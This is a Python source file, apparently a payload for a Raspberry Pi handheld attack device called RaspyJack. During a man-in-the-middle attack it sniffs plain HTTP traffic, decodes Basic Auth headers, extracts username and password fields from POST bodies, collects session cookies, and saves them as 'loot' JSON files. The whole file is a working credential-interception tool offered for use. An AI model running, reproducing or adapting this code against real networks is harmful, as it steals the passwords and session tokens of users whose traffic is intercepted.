#!/usr/bin/env python3
"""
RaspyJack Payload -- Passive HTTP Credential Extractor
======================================================
Author: 7h30th3r0n3

Runs during active MITM.  Uses scapy to sniff TCP port 80 traffic and
extracts HTTP Basic Auth headers, POST form data with credential fields,
and Set-Cookie headers.

Controls:
  OK         -- Start / stop sniffing
  UP / DOWN  -- Scroll captured credentials
  KEY1       -- Toggle interface (eth0 / wlan0)
  KEY2       -- Export results to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/HTTPCreds/http_creds_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import base64
import threading
import re
from datetime import datetime
from urllib.parse import unquote_plus

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import sniff as scapy_sniff, TCP, Raw, IP
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
LOOT_DIR = "/root/Raspyjack/loot/HTTPCreds"
INTERFACES = ["eth0", "wlan0"]

# Credential field names to search in POST bodies
CRED_FIELDS = re.compile(
    r"(user(?:name)?|login|email|pass(?:word)?|passwd|pwd|credential)"
    r"=([^&\r\n]+)",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
sniffing = False
iface_idx = 0

captured = []       # [{"type", "src", "dst", "data", "time"}]
scroll_offset = 0
total_packets = 0
sniffer_thread = None


# ---------------------------------------------------------------------------
# Packet processing
# ---------------------------------------------------------------------------

def _decode_basic_auth(header_value):
    """Decode a Basic auth header value. Returns (user, pass) or None."""
    try:
        encoded = header_value.strip()
        decoded = base64.b64decode(encoded).decode("utf-8", errors="replace")
        if ":" in decoded:
            user, passwd = decoded.split(":", 1)
            return (user, passwd)
    except Exception:
        pass
    return None


def _extract_form_creds(body):
    """Extract credential fields from a URL-encoded POST body."""
    pairs = {}
    for match in CRED_FIELDS.finditer(body):
        field = match.group(1).lower()
        value = unquote_plus(match.group(2))
        pairs[field] = value
    return pairs if pairs else None


def _extract_cookies(header_lines):
    """Extract Set-Cookie values from HTTP response headers."""
    cookies = []
    for line in header_lines:
        if line.lower().startswith("set-cookie:"):
            cookie_val = line.split(":", 1)[1].strip()
            cookies.append(cookie_val[:100])
    return cookies


def _process_packet(pkt):
    """Process a single captured packet for credential data."""
    global total_packets

    if not pkt.haslayer(Raw) or not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return

    with lock:
        total_packets += 1

    try:
        payload = pkt[Raw].load.decode("utf-8", errors="replace")
    except Exception:
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    timestamp = datetime.now().strftime("%H:%M:%S")
    lines = payload.split("\r\n")

    # Check for Basic Auth header
    for line in lines:
        if line.lower().startswith("authorization: basic "):
            b64_part = line.split(" ", 2)[-1]
            decoded = _decode_basic_auth(b64_part)
            if decoded:
                entry = {
                    "type": "BasicAuth",
                    "src": src_ip,
                    "dst": dst_ip,
                    "data": f"{decoded[0]}:{decoded[1]}",
                    "time": timestamp,
                }
                with lock:
                    captured.append(entry)
                return

    # Check for POST form credentials
    if lines and lines[0].upper().startswith("POST "):
        # Body is after the blank line
        body_start = payload.find("\r\n\r\n")
        if body_start >= 0:
            body = payload[body_start + 4:]
            creds = _extract_form_creds(body)
            if creds:
                data_str = " ".join(f"{k}={v}" for k, v in creds.items())
                entry = {
                    "type": "POST",
                    "src": src_ip,
                    "dst": dst_ip,
                    "data": data_str[:120],
                    "time": timestamp,
                }
                with lock:
                    captured.append(entry)
                return

    # Check for Set-Cookie in responses
    cookies = _extract_cookies(lines)
    if cookies:
        for cookie in cookies[:3]:
            entry = {
                "type": "Cookie",
                "src": src_ip,
                "dst": dst_ip,
                "data": cookie[:80],
                "time": timestamp,
            }
            with lock:
                captured.append(entry)


# ---------------------------------------------------------------------------
# Sniffer thread
# ---------------------------------------------------------------------------

def _sniffer_thread_fn(iface):
    """Run scapy sniffer in a background thread."""
    global sniffing
    try:
        scapy_sniff(
            iface=iface,
            filter="tcp port 80",
            prn=_process_packet,
            store=False,
            stop_filter=lambda _pkt: not sniffing or not running,
        )
    except Exception:
        pass
    sniffing = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write captured credentials to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"http_creds_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "total_packets": total_packets,
            "credentials": list(captured),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "HTTP SNIFF", font=font, fill="#FF3366")
    indicator = "#00FF00" if sniffing else "#444"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        creds = list(captured)
        pkts = total_packets
        iface = INTERFACES[iface_idx]

    # Stats line
    d.text((2, 16), f"IF:{iface}  Pkts:{pkts}", font=font, fill="#AAAAAA")
    d.text((2, 26), f"Captured: {len(creds)}", font=font, fill="#AAAAAA")

    # Credential list
    visible = creds[scroll_offset:scroll_offset + ROWS_VISIBLE]
    for i, entry in enumerate(visible):
        y = 38 + i * 12
        type_tag = entry["type"][:5]
        data_preview = entry["data"][:16]

        if entry["type"] == "BasicAuth":
            color = "#00FF00"
        elif entry["type"] == "POST":
            color = "#FFAA00"
        else:
            color = "#888888"

        d.text((2, y), f"[{type_tag}]", font=font, fill=color)
        d.text((40, y), data_preview, font=font, fill="#CCCCCC")

    # Scroll indicator
    total_items = len(creds)
    if total_items > ROWS_VISIBLE:
        bar_area = 60
        ind_h = max(4, int(ROWS_VISIBLE / total_items * bar_area))
        ind_y = 38 + int(scroll_offset / max(total_items, 1) * bar_area)
        d.rectangle((126, ind_y, 127, ind_y + ind_h), fill="#444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if sniffing:
        d.text((2, 117), "OK:Stop K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Sniff K1:IF K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, sniffing, iface_idx, scroll_offset, sniffer_thread

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        d.text((4, 65), "pip install scapy", font=font, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "HTTP CRED SNIFFER", font=font, fill="#FF3366")
    d.text((4, 36), "Passive credential", font=font, fill="#888")
    d.text((4, 46), "extraction from HTTP", font=font, fill="#888")
    d.text((4, 64), "OK    Start/stop", font=font, fill="#666")
    d.text((4, 76), "KEY1  Toggle iface", font=font, fill="#666")
    d.text((4, 88), "KEY2  Export loot", font=font, fill="#666")
    d.text((4, 100), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if sniffing:
                    sniffing = False
                else:
                    iface = INTERFACES[iface_idx]
                    sniffing = True
                    sniffer_thread = threading.Thread(
                        target=_sniffer_thread_fn, args=(iface,), daemon=True,
                    )
                    sniffer_thread.start()
                time.sleep(0.3)

            elif btn == "KEY1" and not sniffing:
                iface_idx = (iface_idx + 1) % len(INTERFACES)
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    has_data = len(captured) > 0
                if has_data:
                    fname = _export_loot()
                    # Flash confirmation
                    img2 = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d2 = ScaledDraw(img2)
                    d2.text((4, 50), "Exported!", font=font, fill="#00FF00")
                    d2.text((4, 65), fname[:22], font=font, fill="#888")
                    lcd.LCD_ShowImage(img2, 0, 0)
                    time.sleep(1.0)
                time.sleep(0.3)

            elif btn == "UP":
                scroll_offset = max(0, scroll_offset - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    max_scroll = max(0, len(captured) - ROWS_VISIBLE)
                scroll_offset = min(scroll_offset + 1, max_scroll)
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        running = False
        sniffing = False
        time.sleep(0.5)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
